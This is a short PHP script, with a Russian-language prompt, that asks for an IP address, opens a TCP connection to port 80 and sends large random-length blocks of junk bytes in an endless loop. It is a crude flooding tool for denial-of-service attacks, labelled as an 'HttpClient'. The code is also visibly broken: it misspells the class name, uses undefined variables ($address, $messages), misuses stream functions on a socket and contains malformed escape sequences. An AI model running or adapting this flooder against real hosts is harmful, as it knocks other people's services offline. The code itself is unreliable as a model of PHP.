<?php

echo "[!] Введите IP: ". PHP_EOL;
echo "» ";
$address = fgets(STDIN);

$httpclient = new HttpClinet(trim($address));
$httpclient->connect();
$httpclient->run();

class HttpClient{
	public $ip;
	public $socket;
	public $connectionStatus = false;
	public function __construct(String $address) {
		$this->ip = $address;
		$this->socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		stream_set_blocking($this->socket, true);
		stream_set_timeout($this->socket, 1);
		}
		public function connect() {
			socket_connect($this->socket, $this->address, 80);
			$this->connectionStatus = true;
			}
			public function run() {
				if($this->connectionStatus == false) {
					echo "Error: Socket can't connected.". PHP_EOL;
					return;
					}
					while(true) {
						$message = str_repeat("\jnX\x0\x\x12\x34\x96\x2048\x2048f\x8000b", mt_rand(1000, 5000));
						socket_send($this->socket, $messages, strlen($message), 0);
						}
						}
						}
						?>